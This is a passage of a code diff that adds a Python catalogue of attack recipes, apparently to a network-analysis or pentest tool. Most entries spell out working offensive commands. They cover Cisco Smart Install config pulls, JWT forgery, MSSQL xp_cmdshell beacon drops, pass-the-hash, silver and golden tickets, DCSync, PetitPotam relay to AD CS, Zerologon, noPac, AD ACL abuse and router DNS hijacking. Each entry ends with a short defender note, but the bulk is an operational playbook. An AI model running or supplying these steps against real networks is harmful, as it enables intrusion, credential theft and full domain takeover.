+            "service is exposed.",
+            "If yours: upgrade ntpd to ≥4.2.8 or add `disable monitor` to ntp.conf. "
+            "Block UDP/123 ingress for everything that isn't an upstream NTP peer.",
+            "If reflection victim (spoofed src): rate-limit UDP/123 egress at the edge; "
+            "file an abuse report against the originating ASN(s).",
+            "Also disable: `version`, `peers`, `iostats`, `sysstats` queries from the "
+            "internet — same CVE family (CVE-2013-5211 + others).",
+        ],
+        "tools": ["ntpdc", "nmap ntp-monlist NSE", "edge ACL"],
+    },
+    {
+        "id": "cisco-smi-pillage",
+        "name": "Cisco Smart Install (SIET) → config pull / RCE",
+        "severity": "critical",
+        "phase": "network",
+        "match_any_category": ["network-device"],
+        "match_substring": ["Smart Install", "SIET", "4786"],
+        "description": ("TCP/4786 unauthenticated Smart Install (CVE-2018-0171, SIET) lets "
+                        "you pull running-config (cleartext enable secrets, type-7 passwords, "
+                        "SNMP communities, VTY ACLs) and push a new config — instant network "
+                        "device takeover."),
+        "steps": [
+            "Confirm reachable: `nmap -p4786 --script smart_install <ip>` or "
+            "`SIET.py -i <ip> -g` (get config).",
+            "Pull config: `SIET.py -i <ip> -g -o pulled.txt`. Crack the type-7 secrets "
+            "instantly (reversible) and the enable secret (hashcat -m 5700 / 9200).",
+            "Pull SNMP RW community from the config → use snmp-set for full device "
+            "control (set ifAdminStatus, reload, change passwords).",
+            "Patch path: `no vstack` on every IOS device. Block TCP/4786 at the edge.",
+        ],
+        "tools": ["SIET (Smart Install Exploitation Tool)", "nmap smart_install",
+                  "ciscot7 (type-7 decode)", "hashcat (5700/9200)"],
+    },
+    {
+        "id": "weak-tls-attacks",
+        "name": "Weak TLS — downgrade / BEAST / POODLE / CRIME / SWEET32",
+        "severity": "high",
+        "phase": "web",
+        "match_any_category": ["tls-weak"],
+        "description": ("Offered SSLv3 / TLS 1.0-1.1 or RC4 / 3DES / EXPORT / NULL / "
+                        "anonymous-DH ciphers means downgrade attacks are on the table. "
+                        "Most are network-position-dependent, but the bug class signals the "
+                        "server is in maintenance debt — there are probably worse problems."),
+        "steps": [
+            "Fingerprint exactly: `sslscan <host>:443` or `testssl.sh <host>:443`.",
+            "If you can MITM: downgrade with the TLS_FALLBACK_SCSV gap and POODLE on "
+            "SSLv3, or strip with bettercap's hstshijack.",
+            "If RC4 still offered: collect ~10⁹ encrypted samples of the same plaintext "
+            "byte (long-lived session) → biased keystream recovers it.",
+            "If 3DES (CBC, SWEET32): need ~32 GB on the same connection — practical only "
+            "for very long sessions (VPN, WebSocket).",
+            "Pivot finding: outdated TLS stack ↔ outdated OS ↔ unpatched RCEs. Banner-"
+            "grab via `curl -k -v https://<host>` and Server header → CVE lookup.",
+        ],
+        "tools": ["sslscan", "testssl.sh", "bettercap hstshijack", "openssl s_client"],
+    },
+    {
+        "id": "jwt-alg-none",
+        "name": "JWT weakness — alg=none / weak HS256 / kid injection",
+        "severity": "critical",
+        "phase": "web",
+        "match_any_category": ["jwt-weak"],
+        "description": ("alg=none accepts a token with an empty signature; weak HS256 "
+                        "secrets crack offline in seconds; kid SQLi / path-traversal lets "
+                        "you sign with anything. Any one of these → full account takeover."),
+        "steps": [
+            "Decode the captured JWT: `jwt_tool <token> -T`. Note `alg`, `kid`, claims, "
+            "expiry.",
+            "alg=none: rebuild the token with `alg: none` header and empty signature; "
+            "most jwt libs <2018 accept it.",
+            "Weak HS256 secret: `hashcat -m 16500 token.txt rockyou.txt -r best64.rule` "
+            "→ if cracked, sign arbitrary tokens.",
+            "kid injection: try `kid: ../../../../dev/null` (signs with empty file), "
+            "`kid: '; SELECT '<key>` (SQLi yields known key).",
+            "Reissue token with elevated claims (admin: true, role: 'superuser', sub: "
+            "a privileged user id). Replay and pwn.",
+        ],
+        "tools": ["jwt_tool", "hashcat (mode 16500)", "Burp Suite JWT Editor"],
+    },
+    {
+        "id": "dns-axfr-recon",
+        "name": "DNS zone transfer → full internal map",
+        "severity": "high",
+        "phase": "recon",
+        "match_any_category": ["dns-vuln"],
+        "match_substring": ["AXFR", "IXFR", "zone transfer"],
+        "description": ("A nameserver that answers AXFR / IXFR for an internal zone hands "
+                        "you every internal host name + IP + service in one query. Eight "
+                        "hours of nmap in one zone transfer."),
+        "steps": [
+            "Reconfirm: `dig @<ns> <zone> AXFR` from your scanner host. If it dumps, save.",
+            "Parse: extract A/AAAA → IP inventory; SRV → AD service map "
+            "(_kerberos._tcp, _ldap._tcp, _autodiscover._tcp); TXT → SPF/DKIM/M365 hints; "
+            "MX → mail flow.",
+            "Cross-reference against the graph — anything in AXFR that you haven't seen "
+            "in the pcap is a fresh target you can pivot toward.",
+            "Patch path on the defender side: restrict AXFR to slave NS IPs only "
+            "(`allow-transfer { <slave-ip>; };` in named.conf or equivalent).",
+        ],
+        "tools": ["dig", "fierce", "dnsenum", "internal recon"],
+    },
+    {
+        "id": "upnp-wan-pivot",
+        "name": "UPnP/SSDP → WAN port forward / IGD abuse",
+        "severity": "high",
+        "phase": "network",
+        "match_any_category": ["iot"],
+        "match_substring": ["SSDP", "UPnP", "M-SEARCH"],
+        "description": ("Routers exposing UPnP's WANIPConnection let any LAN device punch "
+                        "WAN ingress port mappings with no auth. Malware uses this to expose "
+                        "internal RDP/SSH/SMB; attackers on the LAN use it for the same "
+                        "thing intentionally."),
+        "steps": [
+            "Enumerate IGD: `upnpc -l` shows the IGD URL + service list + existing port "
+            "mappings (look for surprising 3389 → INSIDE, 445 → INSIDE).",
+            "Audit existing mappings: any that map internal RDP/SMB/SSH/Telnet to a "
+            "WAN port is an immediate exposure — note the internal IP, that's your "
+            "pivot target.",
+            "Demonstrate: `upnpc -a <local-ip> 22 4444 TCP` punches SSH:4444 on the WAN "
+            "side. If it succeeds, the device honors AddPortMapping with no auth.",
+            "Fix on defender side: disable UPnP on the router; if needed, restrict to "
+            "specific MACs / require WPS PIN.",
+            "Outside attacker variant: SSDP M-SEARCH reflection (CVE-2017-7494 class) — "
+            "block UDP/1900 ingress at the WAN edge.",
+        ],
+        "tools": ["miranda-upnp", "upnpc (miniupnpc)", "umap", "nmap upnp-info"],
+    },
+    {
+        "id": "mssql-cleartext-pivot",
+        "name": "MSSQL plaintext auth → xp_cmdshell RCE",
+        "severity": "critical",
+        "phase": "credential",
+        "match_any_category": ["cleartext-creds", "plaintext-protocol"],
+        "match_substring": ["MSSQL", "TDS", "1433"],
+        "description": ("MSSQL TDS without encryption leaks the login. SQL Server logins "
+                        "with sysadmin → xp_cmdshell → SYSTEM. Service-account logins are "
+                        "usually reused across the SQL estate."),
+        "steps": [
+            "Pull the username + password from the creds tab (TDS LOGIN7 PRELOGIN).",
+            "Auth: `mssqlclient.py <user>:<pass>@<host>` (impacket). Check role: "
+            "`SELECT IS_SRVROLEMEMBER('sysadmin');`.",
+            "If sysadmin: `enable_xp_cmdshell` then `xp_cmdshell 'whoami'`. Drop a "
+            "beacon (Cobalt Strike / Sliver) via `xp_cmdshell powershell -enc <b64>`.",
+            "If not sysadmin: hunt impersonable logins "
+            "(`SELECT a.name FROM sys.server_permissions p JOIN sys.server_principals a "
+            "ON p.grantor_principal_id = a.principal_id WHERE permission_name = "
+            "'IMPERSONATE';`), then `EXECUTE AS LOGIN = '<target>'`.",
+            "Spray the cleartext password across other MSSQL hosts in the pcap (likely "
+            "reuse).",
+        ],
+        "tools": ["impacket mssqlclient", "Powerupsql (Get-SQLInstanceDomain / "
+                  "Invoke-SQLAudit)", "sqlmap (--os-shell)"],
+    },
+    {
+        "id": "snmp-community-pillage",
+        "name": "SNMP community string → device pillage + network map",
+        "severity": "critical",
+        "phase": "network",
+        "match_any_category": ["weak-auth"],
+        "match_substring": ["SNMP"],
+        "description": ("A captured SNMP v1/v2c community grants either read (RO) or write "
+                        "(RW) access depending on which it is. RO walks the device's ARP "
+                        "table, interface list, routing table, and often the running "
+                        "config; RW lets you reconfigure the device — re-route traffic "
+                        "through you, change passwords, or reboot."),
+        "steps": [
+            "Walk: `snmpwalk -c <community> -v 2c <host>`. If it returns the system "
+            "tree, you have at least RO.",
+            "Map the network: pull `ipNetToMediaTable` (ARP), `ifTable` (interfaces), "
+            "`ipRouteTable`. Cross-reference against the graph — you now have every "
+            "ARP-reachable host on every VLAN.",
+            "If Cisco: `snmpwalk -c <community> -v 2c <host> 1.3.6.1.4.1.9.9.96` and "
+            "TFTP-download the running config via SNMP-set on the legacy "
+            "`ccCopyEntry` OIDs — yields enable secrets, type-7 passwords, ACLs.",
+            "Test RW non-destructively: `snmpset -c <community> -v 2c <host> "
+            "<sysContact.0> s 'test'`. If it succeeds, you can also `sysShutdown`, "
+            "change ifAdminStatus, etc.",
+            "Spray the same community across the rest of the network — it's almost "
+            "always reused on every switch / router / WAP from the same vendor.",
+        ],
+        "tools": ["snmpwalk / snmpset (net-snmp)", "onesixtyone (community spray)",
+                  "snmpcheck", "Metasploit auxiliary/scanner/snmp/*"],
+    },
+    {
+        "id": "scanner-traffic-investigate",
+        "name": "Scanner traffic — confirm origin + reuse the recon",
+        "severity": "medium",
+        "phase": "recon",
+        "match_any_category": ["scanner"],
+        "description": ("A User-Agent matching sqlmap/Nikto/Burp/zgrab/feroxbuster/etc. "
+                        "either means you have an authorized scan running, an unauthorized "
+                        "scan from inside the network (compromised host or rogue user), or "
+                        "an external attacker not even bothering to mask. The scan results "
+                        "tell you what they're pivoting toward."),
+        "steps": [
+            "Cross-check with the scanning-engagement schedule. If unsanctioned, treat "
+            "the source IP as compromised / unauthorized — isolate.",
+            "Pull every URL the scanner hit from the HTTP feed: those are the next "
+            "moves the operator will try.",
+            "For each 200-OK response in the scan, that's a path on a target the scanner "
+            "considers interesting — assume the attacker will exploit it next.",
+            "If external: block at perimeter; share the source IP with your CERT/ISAC.",
+            "If internal: live response on the source host (PID-of-curl, network conns, "
+            "history files).",
+        ],
+        "tools": ["graylog / SIEM correlation", "live response", "Velociraptor"],
+    },
+    # ----- classic Active Directory chain -----
+    {
+        "id": "pass-the-hash",
+        "name": "Pass-the-Hash — NT hash → SMB/WinRM/WMI as that user",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["ntlm-capture", "smb"],
+        "description": ("Any NT-hash you hold authenticates the user wherever the protocol "
+                        "accepts NTLM. No password crack required. The cracked half of "
+                        "NetNTLMv2 (or a dumped SAM/NTDS hash) is the input."),
+        "steps": [
+            "Source the hash: NetNTLMv2 cracked offline (mode 5600), SAM dump from a "
+            "compromised endpoint, or `secretsdump` from a target where you already have "
+            "SYSTEM.",
+            "Confirm reachability: `crackmapexec smb <subnet> -u <user> -H <nthash>` "
+            "lists every host where the hash works + admin context.",
+            "Land code: `crackmapexec smb <host> -u <user> -H <nthash> -x 'whoami /all'` "
+            "or `impacket-psexec <user>@<host> -hashes :<nthash>` for an interactive "
+            "SYSTEM shell. WinRM variant: `evil-winrm -i <host> -u <user> -H <nthash>`.",
+            "Pivot off the new host: dump LSASS → harvest more hashes/tickets; check "
+            "`klist` for delegated tickets.",
+            "Defender side: enable LSA Protection + Credential Guard; restrict NTLM "
+            "with auditing first (`Network security: Restrict NTLM`); deploy LAPS so "
+            "local-admin hashes differ per machine.",
+        ],
+        "tools": ["impacket psexec / wmiexec / smbexec",
+                  "CrackMapExec / nxc", "evil-winrm", "mimikatz `sekurlsa::pth`"],
+    },
+    {
+        "id": "overpass-the-hash",
+        "name": "Overpass-the-Hash — NT hash → Kerberos TGT",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["ntlm-capture", "kerberos-weak"],
+        "description": ("Trade an NT hash for a TGT so Kerberos-only services and "
+                        "logged 'NTLM was used' alerts both go quiet. Same hash, different "
+                        "auth surface — what most pentesters call 'Pass-the-Key' on the "
+                        "wire."),
+        "steps": [
+            "`impacket-getTGT <domain>/<user> -hashes :<nthash>` produces a usable "
+            ".ccache.",
+            "Export and use: `export KRB5CCNAME=$PWD/<user>.ccache`. Verify: "
+            "`impacket-psexec -k -no-pass <user>@<host>.<domain>`.",
+            "Or mimikatz: `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> "
+            "/run:powershell` — spawns a process with Kerberos auth.",
+            "Pivot via Kerberos-only services (LDAP-with-channel-binding, MSSQL-with-"
+            "Kerberos, SMB on hosts that disabled NTLM).",
+            "Defender side: same as PtH — enable Credential Guard, audit/restrict NTLM. "
+            "Also alert on TGTs issued for accounts that don't normally need Kerberos.",
+        ],
+        "tools": ["impacket getTGT", "Rubeus asktgt", "mimikatz sekurlsa::pth"],
+    },
+    {
+        "id": "silver-ticket",
+        "name": "Silver Ticket — service NT hash → forged TGS for that SPN",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["kerberos-weak", "ntlm-capture"],
+        "description": ("A service-account NT hash (or computer account $hash) lets you "
+                        "forge a TGS for any SPN that account owns. No KDC contact required "
+                        "— defenders won't see a 4769 because no TGS was actually requested."),
+        "steps": [
+            "Acquire the service account's NT hash (Kerberoast crack, lsadump from a "
+            "host where it logs in, or DCSync if you have replication rights).",
+            "Identify the SPN(s): `setspn -L <svc-account>` or LDAP query "
+            "`(servicePrincipalName=*)`.",
+            "Forge: `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain "
+            "<domain> -spn cifs/<host>.<domain> Administrator` (impersonate any user).",
+            "Load: `export KRB5CCNAME=Administrator.ccache`, then `impacket-psexec -k "
+            "-no-pass <host>.<domain>` (cifs SPN gives SMB; mssqlsvc gives MSSQL; "
+            "http gives WinRM; etc.).",
+            "Persistence variant: forge with a long lifetime ('use after rotate' "
+            "scenarios).",
+            "Defender side: rotate service-account passwords regularly (gMSA preferred); "
+            "monitor 4624 logon-types and Kerberos PAC validation; enable PAC signing.",
+        ],
+        "tools": ["impacket ticketer", "Rubeus silver", "mimikatz kerberos::golden"],
+    },
+    {
+        "id": "golden-ticket",
+        "name": "Golden Ticket — KRBTGT hash → forge TGT for anyone",
+        "severity": "critical",
+        "phase": "AD persistence",
+        "match_any_category": ["smb", "ntlm-capture", "ad-weakness"],
+        "match_substring": ["DCSync", "KRBTGT", "secretsdump", "lsadump"],
+        "description": ("The KRBTGT account's NT hash signs every TGT in the domain. With "
+                        "it you forge TGTs for anyone, with any group membership, for any "
+                        "lifetime — even after the user's password rotates. Domain "
+                        "persistence; needs DA to obtain initially."),
+        "steps": [
+            "Pre-req: domain-admin already, OR DCSync rights "
+            "(`impacket-secretsdump -just-dc-user krbtgt <domain>/<user>@<dc>`).",
+            "Extract domain SID: `Get-ADDomain | select DomainSID` or "
+            "`impacket-lookupsid <user>@<dc>`.",
+            "Forge: `impacket-ticketer -nthash <krbtgt-nthash> -domain-sid <sid> "
+            "-domain <domain> Administrator` → Administrator.ccache.",
+            "Use: `export KRB5CCNAME=Administrator.ccache`; any Kerberos action now runs "
+            "as Administrator with Enterprise-Admins membership.",
+            "Defender side: rotate KRBTGT TWICE (10+ hours apart) — this is the only "
+            "remediation. Monitor TGTs with anomalous PAC sizes or non-default lifetimes.",
+        ],
+        "tools": ["impacket secretsdump", "impacket ticketer",
+                  "Rubeus golden", "mimikatz kerberos::golden"],
+    },
+    {
+        "id": "dcsync-pillage",
+        "name": "DCSync — replicate every NTLM hash from the DC",
+        "severity": "critical",
+        "phase": "AD persistence",
+        "match_any_category": ["ntlm-capture", "smb", "ad-weakness"],
+        "description": ("If your principal has `DS-Replication-Get-Changes` + `DS-Replication-"
+                        "Get-Changes-All` (Domain Admins / Enterprise Admins / built-in "
+                        "Account Operators on some setups), DCSync pulls every account's "
+                        "NTLM history without ever touching the DC's disk — looks like normal "
+                        "replication."),
+        "steps": [
+            "Confirm rights with `BloodHound` `MATCH (n) WHERE n.GetChanges=true RETURN n` "
+            "or `impacket-dacledit -action read -principal <user> -target-dn DC=...`.",
+            "Pull: `impacket-secretsdump -just-dc <domain>/<user>:'<pass>'@<dc>` (or "
+            "`-hashes :<nthash>` if you only have the hash).",
+            "Parse: `<domain>/Administrator:500:aad3b...:31d6cfe...:::` — Administrator NTLM "
+            "is the prize. KRBTGT hash enables the golden-ticket path.",
+            "Crack the LM/NT hashes locally with hashcat (mode 1000) — cracked plaintext "
+            "tells you password policy and reveals reuse.",
+            "Defender side: audit non-tier-0 accounts that have replication rights — "
+            "common misconfiguration. Use `Get-ADObject` + DCSync-specific log "
+            "(event 4662 with the GUID for replication).",
+        ],
+        "tools": ["impacket secretsdump", "mimikatz lsadump::dcsync",
+                  "PowerView Get-DomainObjectACL", "BloodHound"],
+    },
+    {
+        "id": "petitpotam-adcs-esc8",
+        "name": "PetitPotam → NTLM relay to AD CS HTTP enrollment (ESC8)",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["spoofable-resolution", "ntlm-capture", "smb"],
+        "description": ("AD CS web enrollment (certsrv) accepts NTLM and has no channel "
+                        "binding. PetitPotam coerces a DC to authenticate to you over MS-EFSRPC. "
+                        "Relay that auth into AD CS, get a cert in the DC's name, then use "
+                        "the cert via PKINIT for TGT-of-DC$ → full domain compromise."),
+        "steps": [
+            "Find the AD CS web enrollment URL: "
+            "`certutil -config - -ping` or browse `http://<ca>/certsrv/`. "
+            "ESC8 requires NTLM accepted there (channel-binding off / NTLM allowed).",
+            "Start the relay: `impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp "
+            "-smb2support --adcs --template DomainController`.",
+            "Coerce: `python3 PetitPotam.py -u '' -p '' <attacker-ip> <dc-ip>` (anon if "
+            "the host accepts unauthenticated EFSRPC) or with creds.",
+            "Relay extracts a base64 cert. Use it: `python3 gettgtpkinit.py "
+            "<domain>/<dc>$ -cert-pfx dc.pfx dc.ccache` → DC machine TGT.",
+            "From there: `secretsdump -k -no-pass <domain>/<dc>$@<dc>` → KRBTGT → "
+            "golden ticket → domain.",
+            "Defender side: enable EPA + RequireSSL on certsrv (channel binding); "
+            "block MS-EFSRPC at DC firewall (KB5005413); patch the AD CS templates "
+            "(remove Enrollee-Supplies-Subject + Client-Authentication on overly "
+            "permissive templates).",
+        ],
+        "tools": ["impacket ntlmrelayx --adcs", "PetitPotam", "Certipy",
+                  "gettgtpkinit + getnthash (pkinit chain)"],
+    },
+    {
+        "id": "adcs-esc1-template",
+        "name": "AD CS ESC1 — enrollee-supplies-subject template = DA",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["ad-weakness", "ntlm-capture"],
+        "description": ("A certificate template with Enrollee-Supplies-Subject + Client-"
+                        "Authentication EKU + Authenticated-Users enroll permission lets "
+                        "any domain user request a cert in another user's name. PKINIT with "
+                        "that cert gives a TGT for the impersonated user — pick Administrator."),
+        "steps": [
+            "Enumerate: `certipy find -u <user> -p <pass> -dc-ip <dc>` — flags ESC1-ESC11 "
+            "templates automatically.",
+            "Look for `Enrollee Supplies Subject: True`, `Client Authentication: True`, "
+            "and `Enrollment Rights: <Authenticated Users / Domain Users / your group>`.",
+            "Request the cert: `certipy req -u <user> -p <pass> -ca <ca-name> "
+            "-template <template> -upn Administrator@<domain>`.",
+            "Authenticate as Administrator: `certipy auth -pfx administrator.pfx` → "
+            "returns NT hash + TGT.",
+            "Land: `impacket-psexec -hashes :<nthash> Administrator@<dc>` or "
+            "`secretsdump -just-dc` for the full hash set.",
+            "Defender side: remove Enrollee-Supplies-Subject from any template with "
+            "Client-Auth EKU; or remove the EKU; or restrict enrollment to a tier-0 "
+            "group only.",
+        ],
+        "tools": ["Certipy", "PSPKIAudit", "PKINITtools",
+                  "impacket-psexec / secretsdump"],
+    },
+    {
+        "id": "zerologon-cve-2020-1472",
+        "name": "Zerologon (CVE-2020-1472) — instant DA on unpatched DC",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["vuln-version", "smb", "ad-weakness"],
+        "description": ("Netlogon's AES-CFB8 IV bug lets an attacker reset the DC computer "
+                        "account password to an empty string in ~256 attempts. From there: "
+                        "DCSync → KRBTGT → domain. CVSS 10.0; patched August 2020."),
+        "steps": [
+            "Confirm vuln (non-destructive): `python3 zerologon_tester.py <dc-netbios> "
+            "<dc-ip>` — only checks, doesn't change anything.",
+            "Exploit: `python3 cve-2020-1472-exploit.py <dc-netbios> <dc-ip>` — sets "
+            "the DC's machine account password to empty.",
+            "DCSync with empty machine-account password: `impacket-secretsdump -just-dc "
+            "-no-pass <dc-netbios>\\$@<dc-ip>` → KRBTGT hash.",
+            "CRITICAL: restore the DC password BEFORE leaving the engagement, or AD "
+            "replication breaks on next sync. "
+            "`python3 reinstall_original_pw.py <dc-netbios> <dc-ip> <original-hash>` "
+            "(extracted from a registry backup). Otherwise you take the domain offline.",
+            "Defender side: KB4565351 (August 2020) + KB5004442 (DC enforcement). "
+            "Monitor 4742 (computer account password change).",
+        ],
+        "tools": ["zerologon_tester", "cve-2020-1472-exploit (Secura/dirkjanm)",
+                  "impacket secretsdump", "reinstall_original_pw"],
+    },
+    {
+        "id": "nopac-sam-spoof",
+        "name": "noPac (CVE-2021-42278/42287) — sAMAccountName spoof → DA",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["kerberos-weak", "ad-weakness", "ntlm-capture"],
+        "description": ("Combine 42278 (no validation that machine account names end in $) "
+                        "with 42287 (TGS-REQ falls back to the user's sAMAccountName lookup) "
+                        "to request a TGS for the DC's computer account using a renamed "
+                        "user-controlled machine. PAC contains DA SIDs → instant DA from "
+                        "any domain-user account."),
+        "steps": [
+            "Create a machine account (default 10 per user via "
+            "`ms-DS-MachineAccountQuota`): `impacket-addcomputer -computer-name PWN -computer-pass "
+            "Pass123 <domain>/<user>:<pass>`.",
+            "Run noPac: `python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc> -dc-host "
+            "<dc-netbios> --impersonate Administrator -use-ldap`.",
+            "Output: Administrator's NT hash. Use it: `impacket-psexec -hashes "
+            ":<nthash> Administrator@<dc>` → SYSTEM on the DC.",
+            "Land DCSync to dump the rest of the domain.",
+            "Defender side: KB5008380 (Nov 2021 patch). Monitor 4741 (computer account "
+            "created) + 4781 (account name changed) in close succession.",
+        ],
+        "tools": ["noPac (cube0x0)", "impacket addcomputer / psexec",
+                  "Rubeus s4u2self (related exploitation)"],
+    },
+    {
+        "id": "unconstrained-delegation",
+        "name": "Unconstrained delegation → grab TGTs (PrinterBug + relay)",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["kerberos-weak", "ad-weakness", "smb"],
+        "description": ("Any computer / user with TRUSTED_FOR_DELEGATION flagged stores a "
+                        "forwarded TGT for every principal that authenticates to it. Coerce "
+                        "a DC to authenticate (SpoolSample / PrinterBug, PetitPotam, DFSCoerce), "
+                        "extract its TGT from your delegation-enabled host, replay as the DC."),
+        "steps": [
+            "Enumerate principals with unconstrained delegation: "
+            "`impacket-findDelegation <domain>/<user>:<pass>` — note any computers "
+            "OTHER than DCs (the DCs are expected).",
+            "Land on one of those hosts (any local-admin path works).",
+            "Coerce the DC to authenticate: `SpoolSample.exe \\\\<dc>.<domain> "
+            "\\\\<your-host>.<domain>` (printerbug, MS-RPRN) OR "
+            "`python3 PetitPotam.py <your-host> <dc>` (MS-EFSRPC).",
+            "Capture the inbound TGT: on the delegation-enabled host run "
+            "`Rubeus.exe monitor /interval:1 /nowrap` — the DC's TGT appears within seconds.",
+            "Use it: `Rubeus.exe ptt /ticket:<b64>` → run `mimikatz lsadump::dcsync "
+            "/user:krbtgt`.",
+            "Defender side: clear TRUSTED_FOR_DELEGATION on non-tier-0 hosts; mark "
+            "tier-0 accounts as 'Account is sensitive and cannot be delegated'.",
+        ],
+        "tools": ["impacket findDelegation", "Rubeus (monitor + ptt)",
+                  "SpoolSample / PrinterBug", "PetitPotam", "DFSCoerce", "mimikatz"],
+    },
+    {
+        "id": "smb-null-session",
+        "name": "SMB null / anonymous session → IPC$ enumeration",
+        "severity": "high",
+        "phase": "recon",
+        "match_any_category": ["smb", "exposed-service"],
+        "description": ("Pre-Win2003 default and some Samba configs allow anonymous IPC$ "
+                        "binding. From there: SAMR enumerates domain users + groups + "
+                        "password policy; LSARPC enumerates SIDs → usernames. Same primitive "
+                        "is how RID-cycling builds a full user list with no creds."),
+        "steps": [
+            "Test: `crackmapexec smb <subnet> -u '' -p '' --shares` — anonymous + share "
+            "list per host.",
+            "Enumerate users via RID cycling: `impacket-lookupsid <host>/anon@<host> "
+            "-no-pass` or `enum4linux-ng -A -u '' -p '' <host>`.",
+            "Pull password policy: `crackmapexec smb <host> -u '' -p '' --pass-pol` "
+            "(threshold / lockout window — informs spray cadence).",
+            "Feed users into the cred-spray path (see `cred-spray` recipe).",
+            "Defender side: `RestrictAnonymous = 2` in policy, or block SMB from "
+            "untrusted networks entirely. RID cycling specifically uses LSA — restrict "
+            "with `RestrictAnonymousSAM`.",
+        ],
+        "tools": ["CrackMapExec", "enum4linux-ng", "impacket lookupsid / samrdump",
+                  "rpcclient"],
+    },
+    {
+        "id": "ldap-acl-abuse",
+        "name": "LDAP / AD ACL abuse — GenericAll / WriteDACL → escalation",
+        "severity": "high",
+        "phase": "AD lateral",
+        "match_any_category": ["cleartext-creds", "ad-weakness"],
+        "match_substring": ["LDAP", "simple bind"],
+        "description": ("Any captured LDAP credential opens BloodHound-grade enumeration. "
+                        "Misconfigured ACLs on users/groups/computers (GenericAll, GenericWrite, "
+                        "WriteOwner, WriteDACL, AddMember) shortcut to domain admin without "
+                        "any exploit — just protocol-spec moves."),
+        "steps": [
+            "Collect with BloodHound: `bloodhound-python -u <user> -p '<pass>' -d "
+            "<domain> -c All -ns <dc>`. Import the .zip into BloodHound GUI.",
+            "Run analytic 'Shortest Paths to Domain Admins from Owned Principals'. "
+            "Anything within ≤3 hops is opportunity.",
+            "ACL action examples (impacket-dacledit + impacket-owneredit, or PowerView): "
+            "`Add-DomainGroupMember -Identity 'Domain Admins' -Members <you>` on "
+            "GenericAll on the group; force-change another user's password with "
+            "`Set-DomainUserPassword -Identity <victim> -AccountPassword (...)` on "
+            "User-Force-Change-Password.",
+            "Shadow Credentials path on a target computer with msDS-KeyCredentialLink: "
+            "`certipy shadow auto -u <user>@<domain> -p <pass> -account <victim>`.",
+            "Defender side: BloodHound your own AD; remove unnecessary ACLs on "
+            "high-privilege objects; apply tiering.",
+        ],
+        "tools": ["BloodHound (collector + GUI)", "impacket dacledit / owneredit",
+                  "PowerSploit PowerView", "Certipy shadow"],
+    },
+    # ----- consumer / IoT / embedded device chains -----
+    {
+        "id": "router-admin-pwn",
+        "name": "Residential router/gateway admin → CVE + cred reuse",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["router", "Router admin"],
+        "description": ("Consumer ISP gear (Hitron, Technicolor, Arris, TP-Link) admin "
+                        "UIs ship with vendor defaults, decade-old jQuery/AngularJS, and "
+                        "command-injection CGIs. Once in, you control DNS, the upstream "
+                        "WAN port-forwards, and Wi-Fi for everything on the LAN."),
+        "steps": [
+            "Hit the admin URL — note the model from the favicon/UI strings.",
+            "Try the vendor's published default (Telus/Bell `admin/<wifi-key-on-sticker>`, "
+            "Hitron `cusadmin/password`, Technicolor `admin/<8-hex-of-MAC>`).",
+            "Vendor-CVE recon: `searchsploit <model>` + `cve.mitre.org` for the exact "
+            "firmware string in the UI 'About' page. Hitron CGE/CGNV → CVE-2021-32574 "
+            "(unauth RCE); TP-Link Archer family → CVE-2023-1389; D-Link DIR-* → many.",
+            "Pivot: change DNS servers to your machine → strip TLS / inject "
+            "updates → captive-portal exfil. Port-forward your IP to internal RDP/SSH.",
+            "Defender side: rotate the default password the moment a new gateway is "
+            "racked; apply the ISP's auto-update; if WAN admin is exposed, file a "
+            "CR to disable it.",
+        ],
+        "tools": ["routersploit", "Burp Suite (UI fuzz)", "exploitdb / vendor CVE list",
+                  "nmap (banner + http-enum)"],
+    },
+    {
+        "id": "stb-dial-pwn",
+        "name": "Set-top box — DIAL launch + DHCP upgrade-url + GENA SSRF",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Set-top box", "STB", "DIAL"],
+        "description": ("STBs (Zenterio/Roku/Vizio class) ship a DIAL receiver that takes "
+                        "unauth app-launch POSTs from any LAN host, a GENA event server "
+                        "that reflects to attacker-supplied CALLBACK URLs (SSRF / amplifier), "
+                        "and a DHCP-driven firmware-upgrade URL (option 40) usable from "
+                        "any rogue DHCP on the segment."),
+        "steps": [
+            "Fingerprint: `curl -s http://<stb>:<port>/xml/dd.xml` reveals UDN, model, "
+            "controlURL + eventSubURL. Server header `Linux/... UPnP/1.1 <stack>/<ver>` "
+            "pins the firmware.",
+            "DIAL CSRF: POST to `/apps/<AppName>` with text/plain body — most receivers "
+            "skip CORS preflight on simple POST. Inject payload bodies the app trusts "
+            "(YouTube pairing, Netflix nflxso URL, custom additionalData).",
+            "GENA SSRF: `SUBSCRIBE <eventSubURL>` with `CALLBACK: <http://127.0.0.1:<port>/>` "
+            "→ STB POSTs NOTIFY to localhost-only services it can reach but you can't.",
+            "DHCP upgrade-url MITM: stand up a rogue DHCP on the segment serving option 40 "
+            "or vendor option 43/125 (BBF VIVSO for TR-069). Plain-HTTP firmware "
+            "bootstrap URLs (`http://...cdn.../config.ini`) become attacker-controlled.",
+            "TLS-pinning bypass: portal URL HTTPS uses the device cert store — drop "
+            "a trusted CA via the gateway path above and you serve replacement boot UI "
+            "with full JS-API access.",
+            "Defender side: signed boot URLs only, strict CORS + Origin on DIAL, "
+            "GENA CALLBACK whitelist (deny private IPs), pin the upgrade CDN cert.",
+        ],
+        "tools": ["curl + custom DIAL POSTs", "ssdp.py / upnpc",
+                  "Python rogue DHCP (scapy) for option 40 / 43 fuzz",
+                  "mitmproxy (portal-URL transparent intercept)"],
+    },
+    {
+        "id": "printer-pjl-pillage",
+        "name": "Printer — PJL/PostScript pillage on tcp/9100",
